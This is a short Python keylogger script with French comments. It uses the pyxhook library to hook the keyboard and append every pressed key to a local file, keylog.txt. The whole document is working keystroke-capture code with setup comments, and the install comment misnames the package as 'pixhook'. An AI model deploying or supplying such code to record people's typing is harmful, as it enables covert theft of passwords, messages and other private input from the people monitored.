#ouvrir l'invite de commande
#ensuite pip install pixhook
import pyxhook

# définition d'une fonction pour les evénements de touche
# Nom du fichier où les frappes seront stockées
log_file = "keylog.txt"

# Appel d'une fonction de récupération des touches 
def on_key_press(event):
       # Identifie la touche pressée
    key = event.Key
    
    # Écriture et ouverture dans le fichier en mode append "a" 
    with open(log_file, "a") as f:
        f.write(f"Key pressed: {key}\n")

#création d'une instance hookmanager 
hookman = pyxhook.HookManager()#défilnition d'une variable d'identification du pyxhookManager

# appel de la fonction pour les touches
hookman.KeyDown = on_key_press

# Hooker le clavier 
hookman.HookKeyboard()

# démarrage du hook 
hookman.start()
